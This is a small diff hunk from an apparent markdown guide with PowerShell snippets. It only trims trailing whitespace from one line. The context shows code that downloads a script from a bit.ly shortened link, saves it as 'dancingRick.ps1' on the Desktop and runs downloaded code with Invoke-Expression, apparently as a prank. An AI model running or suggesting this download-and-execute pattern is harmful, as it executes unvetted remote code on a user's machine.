@@ -63,7 +63,7 @@ Invoke-Expression -Command $code
 ```powershell
 # download code
 $url = "http://bit.ly/e0Mw9w"
-$code = Invoke-RestMethod -Uri $url -UseBasicParsing 
+$code = Invoke-RestMethod -Uri $url -UseBasicParsing
 
 # save to file and run
 $outPath = "$home\Desktop\dancingRick.ps1"
